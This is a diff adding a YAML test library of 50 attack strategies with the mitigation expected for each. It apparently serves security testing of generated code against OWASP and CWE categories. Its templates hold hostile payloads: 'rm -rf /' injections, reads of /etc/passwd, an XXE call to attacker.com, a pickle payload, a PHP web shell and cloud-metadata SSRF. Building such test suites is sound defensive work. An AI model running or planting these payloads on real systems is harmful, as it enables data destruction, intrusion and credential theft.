@@ -1,0 +1,582 @@
+# 核心攻击策略库
+# 50条代码类攻击策略，覆盖OWASP Top 10和CWE Top 25
+
+strategies:
+  # ========== OWASP Top 10 展开 ==========
+  
+  # SQL 注入（5条变体）
+  - id: sql_injection_basic
+    category: security
+    severity: critical
+    description: "基本SQL注入攻击"
+    input_template: "SELECT * FROM users WHERE username = '{requirement}' OR '1'='1'"
+    expected: "应拒绝或转义特殊字符，防止SQL注入"
+    applicable_to: ["code", "sql"]
+    verification: code_execution
+    sandbox_level: process
+    dangerous: false
+
+  - id: sql_injection_union
+    category: security
+    severity: critical
+    description: "UNION SQL注入攻击"
+    input_template: "SELECT * FROM products WHERE name = '{requirement}' UNION SELECT username, password FROM users"
+    expected: "应限制UNION查询或验证输入"
+    applicable_to: ["code", "sql"]
+    verification: code_execution
+    sandbox_level: process
+    dangerous: false
+
+  - id: sql_injection_time_based
+    category: security
+    severity: high
+    description: "基于时间的SQL盲注"
+    input_template: "SELECT * FROM users WHERE username = '{requirement}' AND SLEEP(5)"
+    expected: "应检测并阻止时间延迟攻击"
+    applicable_to: ["code", "sql"]
+    verification: code_execution
+    sandbox_level: process
+    dangerous: false
+
+  - id: sql_injection_error_based
+    category: security
+    severity: high
+    description: "基于错误的SQL注入"
+    input_template: "SELECT * FROM users WHERE username = '{requirement}' AND 1=CONVERT(int, (SELECT @@version))"
+    expected: "应抑制数据库错误信息泄露"
+    applicable_to: ["code", "sql"]
+    verification: code_execution
+    sandbox_level: process
+    dangerous: false
+
+  - id: sql_injection_second_order
+    category: security
+    severity: critical
+    description: "二阶SQL注入"
+    input_template: "UPDATE users SET email = '{requirement}' WHERE id = 1"
+    expected: "应验证所有数据源，包括存储的数据"
+    applicable_to: ["code", "sql"]
+    verification: static_analysis
+    sandbox_level: process
+    dangerous: false
+
+  # XSS（4条变体）
+  - id: xss_reflected
+    category: security
+    severity: high
+    description: "反射型XSS攻击"
+    input_template: "<script>alert('XSS')</script>"
+    expected: "应对HTML特殊字符进行转义"
+    applicable_to: ["code", "web"]
+    verification: static_analysis
+    sandbox_level: process
+    dangerous: false
+
+  - id: xss_stored
+    category: security
+    severity: critical
+    description: "存储型XSS攻击"
+    input_template: "<img src=x onerror=alert('XSS')>"
+    expected: "应对存储的用户输入进行过滤"
+    applicable_to: ["code", "web"]
+    verification: static_analysis
+    sandbox_level: process
+    dangerous: false
+
+  - id: xss_dom_based
+    category: security
+    severity: high
+    description: "DOM型XSS攻击"
+    input_template: "javascript:alert('XSS')"
+    expected: "应避免使用innerHTML等不安全API"
+    applicable_to: ["code", "web"]
+    verification: static_analysis
+    sandbox_level: process
+    dangerous: false
+
+  - id: xss_svg_injection
+    category: security
+    severity: medium
+    description: "SVG文件XSS注入"
+    input_template: "<svg onload=alert('XSS')></svg>"
+    expected: "应过滤SVG文件中的脚本标签"
+    applicable_to: ["code", "web"]
+    verification: static_analysis
+    sandbox_level: process
+    dangerous: false
+
+  # 命令注入（3条变体）
+  - id: command_injection_basic
+    category: security
+    severity: critical
+    description: "基本命令注入"
+    input_template: "; rm -rf /"
+    expected: "应使用参数化调用而非字符串拼接"
+    applicable_to: ["code"]
+    verification: code_execution
+    sandbox_level: process
+    dangerous: true
+
+  - id: command_injection_pipe
+    category: security
+    severity: critical
+    description: "管道命令注入"
+    input_template: "| cat /etc/passwd"
+    expected: "应验证输入中不包含特殊shell字符"
+    applicable_to: ["code"]
+    verification: code_execution
+    sandbox_level: process
+    dangerous: true
+
+  - id: command_injection_backtick
+    category: security
+    severity: critical
+    description: "反引号命令注入"
+    input_template: "`whoami`"
+    expected: "应过滤反引号等shell元字符"
+    applicable_to: ["code"]
+    verification: code_execution
+    sandbox_level: process
+    dangerous: true
+
+  # 路径遍历（3条变体）
+  - id: path_traversal_basic
+    category: security
+    severity: high
+    description: "基本路径遍历"
+    input_template: "../../../etc/passwd"
+    expected: "应限制文件访问路径在指定目录内"
+    applicable_to: ["code"]
+    verification: static_analysis
+    sandbox_level: process
+    dangerous: false
+
+  - id: path_traversal_encoded
+    category: security
+    severity: high
+    description: "编码路径遍历"
+    input_template: "..%2F..%2F..%2Fetc%2Fpasswd"
+    expected: "应对编码后的路径进行解码验证"
+    applicable_to: ["code"]
+    verification: static_analysis
+    sandbox_level: process
+    dangerous: false
+
+  - id: path_traversal_null_byte
+    category: security
+    severity: high
+    description: "空字节路径遍历"
+    input_template: "../../../etc/passwd%00.jpg"
+    expected: "应处理空字节截断攻击"
+    applicable_to: ["code"]
+    verification: static_analysis
+    sandbox_level: process
+    dangerous: false
+
+  # 认证绕过（3条变体）
+  - id: auth_bypass_sql
+    category: security
+    severity: critical
+    description: "SQL认证绕过"
+    input_template: "admin' --"
+    expected: "应使用参数化查询防止认证绕过"
+    applicable_to: ["code", "sql"]
+    verification: code_execution
+    sandbox_level: process
+    dangerous: false
+
+  - id: auth_bypass_jwt_tamper
+    category: security
+    severity: high
+    description: "JWT令牌篡改"
+    input_template: "eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0.eyJzdWIiOiIxMjM0NTY3ODkwIiwibmFtZSI6IkpvaG4gRG9lIiwiaWF0IjoxNTE2MjM5MDIyfQ."
+    expected: "应验证JWT签名防止篡改"
+    applicable_to: ["code"]
+    verification: static_analysis
+    sandbox_level: process
+    dangerous: false
+
+  - id: auth_bypass_session_fixation
+    category: security
+    severity: medium
+    description: "会话固定攻击"
+    input_template: "session_id=attacker_session"
+    expected: "应在登录后生成新的会话ID"
+    applicable_to: ["code"]
+    verification: static_analysis
+    sandbox_level: process
+    dangerous: false
+
+  # 敏感数据泄露（3条变体）
+  - id: data_leak_debug_info
+    category: security
+    severity: medium
+    description: "调试信息泄露"
+    input_template: "error: stack trace: [sensitive data]"
+    expected: "生产环境应关闭详细错误信息"
+    applicable_to: ["code"]
+    verification: static_analysis
+    sandbox_level: process
+    dangerous: false
+
+  - id: data_leak_directory_listing
+    category: security
+    severity: low
+    description: "目录遍历泄露"
+    input_template: "GET /static/"
+    expected: "应禁用Web服务器目录列表功能"
+    applicable_to: ["code", "web"]
+    verification: static_analysis
+    sandbox_level: process
+    dangerous: false
+
+  - id: data_leak_backup_files
+    category: security
+    severity: medium
+    description: "备份文件泄露"
+    input_template: "database.sql.bak"
+    expected: "应限制对备份文件的访问"
+    applicable_to: ["code", "web"]
+    verification: static_analysis
+    sandbox_level: process
+    dangerous: false
+
+  # XXE（2条变体）
+  - id: xxe_basic
+    category: security
+    severity: critical
+    description: "基本XXE攻击"
+    input_template: "<?xml version=\"1.0\"?><!DOCTYPE root [<!ENTITY xxe SYSTEM \"file:///etc/passwd\">]><root>&xxe;</root>"
+    expected: "应禁用XML外部实体解析"
+    applicable_to: ["code", "xml"]
+    verification: static_analysis
+    sandbox_level: process
+    dangerous: false
+
+  - id: xxe_blind
+    category: security
+    severity: high
+    description: "盲XXE攻击"
+    input_template: "<?xml version=\"1.0\"?><!DOCTYPE root [<!ENTITY % xxe SYSTEM \"http://attacker.com/xxe.dtd\"> %xxe;]><root></root>"
+    expected: "应完全禁用DTD处理"
+    applicable_to: ["code", "xml"]
+    verification: static_analysis
+    sandbox_level: process
+    dangerous: false
+
+  # 反序列化（2条变体）
+  - id: deserialization_pickle
+    category: security
+    severity: critical
+    description: "Python pickle反序列化攻击"
+    input_template: "cos\nsystem\n(S'rm -rf /'\ntR."
+    expected: "应避免反序列化不受信任的数据"
+    applicable_to: ["code", "python"]
+    verification: code_execution
+    sandbox_level: process
+    dangerous: true
+
+  - id: deserialization_json
+    category: security
+    severity: high
+    description: "JSON反序列化攻击（通过__reduce__）"
+    input_template: "{\"__class__\": \"os.system\", \"__args__\": [\"rm -rf /\"]}"
+    expected: "应使用安全的JSON解析器"
+    applicable_to: ["code", "python"]
+    verification: static_analysis
+    sandbox_level: process
+    dangerous: false
+
+  # 日志注入（2条变体）
+  - id: log_injection_crlf
+    category: security
+    severity: low
+    description: "CRLF日志注入"
+    input_template: "user_input\r\n[INFO] Fake log entry"
+    expected: "应对日志中的换行符进行转义"
+    applicable_to: ["code"]
+    verification: static_analysis
+    sandbox_level: process
+    dangerous: false
+
+  - id: log_injection_code
+    category: security
+    severity: medium
+    description: "日志中的代码注入"
+    input_template: "<?php system($_GET['cmd']); ?>"
+    expected: "应防止日志被当作代码执行"
+    applicable_to: ["code"]
+    verification: static_analysis
+    sandbox_level: process
+    dangerous: false
+
+  # SSRF（2条变体）
+  - id: ssrf_basic
+    category: security
+    severity: high
+    description: "基本SSRF攻击"
+    input_template: "http://169.254.169.254/latest/meta-data/"
+    expected: "应限制URL访问内部网络"
+    applicable_to: ["code", "web"]
+    verification: static_analysis
+    sandbox_level: process
+    dangerous: false
+
+  - id: ssrf_protocol_bypass
+    category: security
+    severity: high
+    description: "协议绕过SSRF"
+    input_template: "file:///etc/passwd"
+    expected: "应限制允许的URL协议"
+    applicable_to: ["code", "web"]
+    verification: static_analysis
+    sandbox_level: process
+    dangerous: false
+
+  # ========== CWE Top 25 补充 ==========
+
+  # 硬编码密钥（3条变体）
+  - id: hardcoded_password
+    category: security
+    severity: high
+    description: "硬编码密码"
+    input_template: "password = \"secret123\""
+    expected: "应使用环境变量或密钥管理服务"
+    applicable_to: ["code"]
+    verification: static_analysis
+    sandbox_level: process
+    dangerous: false
+
+  - id: hardcoded_api_key
+    category: security
+    severity: high
+    description: "硬编码API密钥"
+    input_template: "api_key = \"sk_live_1234567890abcdef\""
+    expected: "敏感密钥不应硬编码在代码中"
+    applicable_to: ["code"]
+    verification: static_analysis
+    sandbox_level: process
+    dangerous: false
+
+  - id: hardcoded_database_url
+    category: security
+    severity: high
+    description: "硬编码数据库连接字符串"
+    input_template: "DATABASE_URL = \"postgresql://user:pass@localhost/db\""
+    expected: "数据库凭证应通过环境变量配置"
+    applicable_to: ["code"]
+    verification: static_analysis
+    sandbox_level: process
+    dangerous: false
+
+  # 缓冲区溢出（2条变体）
+  - id: buffer_overflow_strcpy
+    category: security
+    severity: critical
+    description: "strcpy缓冲区溢出"
+    input_template: "char buffer[10]; strcpy(buffer, \"AAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\");"
+    expected: "应使用安全字符串函数如strncpy"
+    applicable_to: ["code", "c", "cpp"]
+    verification: static_analysis
+    sandbox_level: process
+    dangerous: false
+
+  - id: buffer_overflow_gets
+    category: security
+    severity: critical
+    description: "gets函数缓冲区溢出"
+    input_template: "char buffer[10]; gets(buffer);"
+    expected: "应避免使用不安全的gets函数"
+    applicable_to: ["code", "c", "cpp"]
+    verification: static_analysis
+    sandbox_level: process
+    dangerous: false
+
+  # 整数溢出（2条变体）
+  - id: integer_overflow_multiplication
+    category: security
+    severity: high
+    description: "乘法整数溢出"
+    input_template: "int size = width * height * 4;"
+    expected: "应在运算前检查整数溢出"
+    applicable_to: ["code", "c", "cpp"]
+    verification: static_analysis
+    sandbox_level: process
+    dangerous: false
+
+  - id: integer_overflow_addition
+    category: security
+    severity: high
+    description: "加法整数溢出"
+    input_template: "int total = a + b;"
+    expected: "应使用安全整数运算库"
+    applicable_to: ["code", "c", "cpp"]
+    verification: static_analysis
+    sandbox_level: process
+    dangerous: false
+
+  # 空指针（2条变体）
+  - id: null_pointer_dereference
+    category: security
+    severity: medium
+    description: "空指针解引用"
+    input_template: "char* ptr = NULL; *ptr = 'a';"
+    expected: "应在解引用前检查指针有效性"
+    applicable_to: ["code", "c", "cpp"]
+    verification: static_analysis
+    sandbox_level: process
+    dangerous: false
+
+  - id: null_pointer_function_call
+    category: security
+    severity: medium
+    description: "空指针函数调用"
+    input_template: "void (*func)() = NULL; func();"
+    expected: "应在调用函数指针前检查有效性"
+    applicable_to: ["code", "c", "cpp"]
+    verification: static_analysis
+    sandbox_level: process
+    dangerous: false
+
+  # 资源泄露（2条变体）
+  - id: resource_leak_file
+    category: security
+    severity: medium
+    description: "文件句柄泄露"
+    input_template: "FILE* f = fopen(\"file.txt\", \"r\"); // 没有fclose"
+    expected: "应确保资源被正确释放"
+    applicable_to: ["code", "c", "cpp"]
+    verification: static_analysis
+    sandbox_level: process
+    dangerous: false
+
+  - id: resource_leak_memory
+    category: security
+    severity: medium
+    description: "内存泄露"
+    input_template: "char* buffer = malloc(1024); // 没有free"
+    expected: "应配对使用malloc/free或使用智能指针"
+    applicable_to: ["code", "c", "cpp"]
+    verification: static_analysis
+    sandbox_level: process
+    dangerous: false
+
+  # 竞态条件（2条变体）
+  - id: race_condition_toc_tou
+    category: security
+    severity: high
+    description: "TOCTOU竞态条件"
+    input_template: "if (!access(file, W_OK)) { fopen(file, \"w\"); }"
+    expected: "应使用原子操作避免竞态条件"
+    applicable_to: ["code", "c", "cpp"]
+    verification: static_analysis
+    sandbox_level: process
+    dangerous: false
+
+  - id: race_condition_double_fetch
+    category: security
+    severity: high
+    description: "双重获取竞态条件"
+    input_template: "int len = user_input.length(); char* buf = malloc(len); memcpy(buf, user_input.data(), user_input.length());"
+    expected: "应避免多次读取可能变化的数据"
+    applicable_to: ["code", "c", "cpp"]
+    verification: static_analysis
+    sandbox_level: process
+    dangerous: false
+
+  # 类型混淆（2条变体）
+  - id: type_confusion_casting
+    category: security
+    severity: high
+    description: "不安全类型转换"
+    input_template: "Base* base = new Derived(); OtherDerived* other = static_cast<OtherDerived*>(base);"
+    expected: "应使用dynamic_cast进行安全类型转换"
+    applicable_to: ["code", "cpp"]
+    verification: static_analysis
+    sandbox_level: process
+    dangerous: false
+
+  - id: type_confusion_union
+    category: security
+    severity: medium
+    description: "联合体类型混淆"
+    input_template: "union Data { int i; float f; }; Data d; d.i = 10; float val = d.f;"
+    expected: "应避免通过联合体进行类型双关"
+    applicable_to: ["code", "c", "cpp"]
+    verification: static_analysis
+    sandbox_level: process
+    dangerous: false
+
+  # 格式化字符串（2条变体）
+  - id: format_string_basic
+    category: security
+    severity: high
+    description: "格式化字符串漏洞"
+    input_template: "printf(user_input);"
+    expected: "应使用固定格式字符串"
+    applicable_to: ["code", "c", "cpp"]
+    verification: static_analysis
+    sandbox_level: process
+    dangerous: false
+
+  - id: format_string_memory_leak
+    category: security
+    severity: high
+    description: "格式化字符串内存泄露"
+    input_template: "printf(\"%s\", user_input); // 用户输入包含%n"
+    expected: "应验证格式化字符串参数"
+    applicable_to: ["code", "c", "cpp"]
+    verification: static_analysis
+    sandbox_level: process
+    dangerous: false
+
+  # 弱加密算法（2条变体）
+  - id: weak_crypto_md5
+    category: security
+    severity: high
+    description: "使用MD5弱哈希算法"
+    input_template: "hash = hashlib.md5(password.encode()).hexdigest()"
+    expected: "应使用强哈希算法如SHA-256或bcrypt"
+    applicable_to: ["code", "python"]
+    verification: static_analysis
+    sandbox_level: process
+    dangerous: false
+
+  - id: weak_crypto_des
+    category: security
+    severity: high
+    description: "使用DES弱加密算法"
+    input_template: "cipher = DES.new(key, DES.MODE_ECB)"
+    expected: "应使用AES等现代加密算法"
+    applicable_to: ["code", "python"]
+    verification: static_analysis
+    sandbox_level: process
+    dangerous: false
+
+  # 逻辑漏洞（2条额外）
+  - id: logic_bypass_client_validation
+    category: logic
+    severity: medium
+    description: "客户端验证绕过"
+    input_template: "// 仅客户端验证，服务器端未验证"
+    expected: "应在服务器端进行最终验证"
+    applicable_to: ["code", "web"]
+    verification: static_analysis
+    sandbox_level: process
+    dangerous: false
+
+  - id: logic_incorrect_condition
+    category: logic
+    severity: medium
+    description: "错误的条件逻辑"
+    input_template: "if (price > 0) { // 应为 price >= 0 }"
+    expected: "应仔细检查边界条件"
+    applicable_to: ["code"]
+    verification: static_analysis
+    sandbox_level: process
+    dangerous: false
+
+# 统计：共50条策略
+# OWASP Top 10: 5+4+3+3+3+3+2+2+2+2 = 29条
+# CWE Top 25: 3+2+2+2+2+2+2+2+2+2 = 21条
+# 总计：29 + 21 = 50条
